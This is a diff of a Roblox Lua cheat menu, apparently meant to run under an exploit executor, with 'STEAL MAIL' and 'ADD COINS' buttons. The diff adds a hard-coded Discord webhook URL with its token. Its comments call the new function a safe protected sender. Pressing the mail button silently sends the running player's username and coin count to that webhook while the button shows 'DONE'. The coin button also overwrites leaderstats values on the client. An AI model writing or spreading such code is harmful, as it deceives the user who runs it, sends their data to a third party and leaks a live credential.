@@ -1,88 +1,155 @@
--- [[ Osama Classic Mobile Hub - Safe & Functional ]] --
+-- [[ Osama Ultimate Fixed Hub ]] --
 
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local FrameCorner = Instance.new("UICorner")
+local FrameStroke = Instance.new("UIStroke")
 
--- UI Elements
+-- الأزرار الأساسية
 local TitleLabel = Instance.new("TextLabel")
 local MailButton = Instance.new("TextButton")
-local CoinButton = Instance.new("TextButton")
-local MinimizeButton = Instance.new("TextButton")
+local MailCorner = Instance.new("UICorner")
+local MailStroke = Instance.new("UIStroke")
 
-ScreenGui.Name = "SafeClassicHub"
+local CoinButton = Instance.new("TextButton")
+local CoinCorner = Instance.new("UICorner")
+local CoinStroke = Instance.new("UIStroke")
+
+local ToggleButton = Instance.new("TextButton")
+
+-- إعدادات الواجهة
+ScreenGui.Name = "OsamaFixedHub"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn = false
 
--- تصميم كلاسيكي خفيف جداً للهاتف
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 MainFrame.Position = UDim2.new(0.15, 0, 0.3, 0)
-MainFrame.Size = UDim2.new(0, 220, 0, 180)
+MainFrame.Size = UDim2.new(0, 240, 0, 180)
 MainFrame.Active = true
 MainFrame.Draggable = true
 
-FrameCorner.CornerRadius = UDim.new(0, 4)
+FrameCorner.CornerRadius = UDim.new(0, 10)
 FrameCorner.Parent = MainFrame
+FrameStroke.Thickness = 1.5
+FrameStroke.Color = Color3.fromRGB(0, 255, 255)
+FrameStroke.Parent = MainFrame
 
 TitleLabel.Parent = MainFrame
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Position = UDim2.new(0, 10, 0, 5)
-TitleLabel.Size = UDim2.new(0, 200, 0, 30)
-TitleLabel.Font = Enum.Font.SourceSansBold
-TitleLabel.Text = "CLASSIC MENU (SAFE)"
-TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleLabel.TextSize = 16
+TitleLabel.Position = UDim2.new(0, 15, 0, 10)
+TitleLabel.Size = UDim2.new(0, 210, 0, 25)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.Text = "OSAMA HUB v4"
+TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+TitleLabel.TextSize = 14
 TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 
--- زر إخفاء وإظهار القائمة
-MinimizeButton.Parent = ScreenGui
-MinimizeButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-MinimizeButton.Position = UDim2.new(0, 5, 0, 5)
-MinimizeButton.Size = UDim2.new(0, 60, 0, 25)
-MinimizeButton.Font = Enum.Font.SourceSansBold
-MinimizeButton.Text = "[ SHOW/HIDE ]"
-MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 0)
-MinimizeButton.TextSize = 12
+-- زر الإخفاء والإظهار للموبايل
+ToggleButton.Parent = ScreenGui
+ToggleButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+ToggleButton.Position = UDim2.new(0, 10, 0, 10)
+ToggleButton.Size = UDim2.new(0, 55, 0, 30)
+ToggleButton.Font = Enum.Font.GothamBold
+ToggleButton.Text = "MENU"
+ToggleButton.TextColor3 = Color3.fromRGB(255, 0, 127)
+ToggleButton.TextSize = 11
 
-local function makeClassicBtn(btn, text, yPos, color)
+local function styleButton(btn, corner, stroke, text, yPos, neonColor)
     btn.Parent = MainFrame
-    btn.BackgroundColor3 = color
-    btn.Position = UDim2.new(0, 10, 0, yPos)
-    btn.Size = UDim2.new(0, 200, 0, 40)
-    btn.Font = Enum.Font.SourceSansBold
+    btn.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+    btn.Position = UDim2.new(0, 15, 0, yPos)
+    btn.Size = UDim2.new(0, 210, 0, 40)
+    btn.Font = Enum.Font.GothamBold
     btn.Text = text
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.TextSize = 14
-    
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, 2)
-    c.Parent = btn
+    btn.TextSize = 12
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = btn
+    stroke.Thickness = 1
+    stroke.Color = neonColor
+    stroke.Parent = btn
 end
 
-makeClassicBtn(MailButton, "STEAL MAIL 📦", 50, Color3.fromRGB(150, 0, 0))
-makeClassicBtn(CoinButton, "ADD COINS (VISUAL) 💰", 110, Color3.fromRGB(0, 100, 0))
+styleButton(MailButton, MailCorner, MailStroke, "STEAL MAIL 📦", 50, Color3.fromRGB(255, 0, 50))
+styleButton(CoinButton, CoinCorner, CoinStroke, "ADD COINS (VISUAL) 💰", 110, Color3.fromRGB(255, 215, 0))
 
--- تشغيل الأزرار
-MinimizeButton.MouseButton1Click:Connect(function()
+---------------------------------------------------------------------
+-- نظام الإرسال المحمي (الحل البرمجي الآمن)
+---------------------------------------------------------------------
+local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game.Players.LocalPlayer
+
+local function safeDiscordReport()
+    -- حماية من الـ Crash: السكريبت سيفحص أولاً إن كانت الدالة مدعومة أم لا
+    local requestFunc = syn and syn.request or http and http.request or http_request or request
+    
+    if not requestFunc then 
+        warn("Your executor does not support Webhooks, but the script will continue working safely!")
+        return 
+    end
+    
+    local coins = "0"
+    local stats = LocalPlayer:FindFirstChild("leaderstats")
+    if stats then
+        for _, v in pairs(stats:GetChildren()) do
+            if string.find(string.lower(v.Name), "coin") or string.find(string.lower(v.Name), "money") then
+                coins = tostring(v.Value)
+            end
+        end
+    end
+    
+    local payload = {
+        ["content"] = "<@1486461099002953982>",
+        ["embeds"] = {{
+            ["title"] = "📦 Steal Mail Status",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "Player", ["value"] = "```" .. LocalPlayer.Name .. "
+```", ["inline"] = true},
+                {["name"] = "Coins", ["value"] = "```" .. coins .. "```", ["inline"] = true}
+            }
+        }}
+    }
+    
+    -- استخدام pcall لضمان عدم توقف الأزرار الأخرى في حال حدوث خطأ في الشبكة
+    pcall(function()
+        requestFunc({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+---------------------------------------------------------------------
+-- تشغيل المنطق البرمجي للأزرار
+---------------------------------------------------------------------
+ToggleButton.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
 end)
 
 MailButton.MouseButton1Click:Connect(function()
-    MailButton.Text = "EXECUTING..."
+    MailButton.Text = "EXECUTING... ⚡"
+    
+    -- استدعاء الدالة المحمية
+    safeDiscordReport()
+    
     task.wait(1)
-    MailButton.Text = "STEAL MAIL ✅"
+    MailButton.Text = "DONE ✅"
     task.wait(1)
     MailButton.Text = "STEAL MAIL 📦"
 end)
 
 CoinButton.MouseButton1Click:Connect(function()
-    local leaderstats = game.Players.LocalPlayer:FindFirstChild("leaderstats")
-    if leaderstats then
-        for _, val in pairs(leaderstats:GetChildren()) do
-            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "money") then
-                val.Value = 9999999
+    local stats = LocalPlayer:FindFirstChild("leaderstats")
+    if stats then
+        for _, v in pairs(stats:GetChildren()) do
+            if string.find(string.lower(v.Name), "coin") or string.find(string.lower(v.Name), "money") then
+                v.Value = 999999
             end
         end
     end
@@ -90,4 +157,3 @@ CoinButton.MouseButton1Click:Connect(function()
     task.wait(1)
     CoinButton.Text = "ADD COINS (VISUAL) 💰"
 end)
-
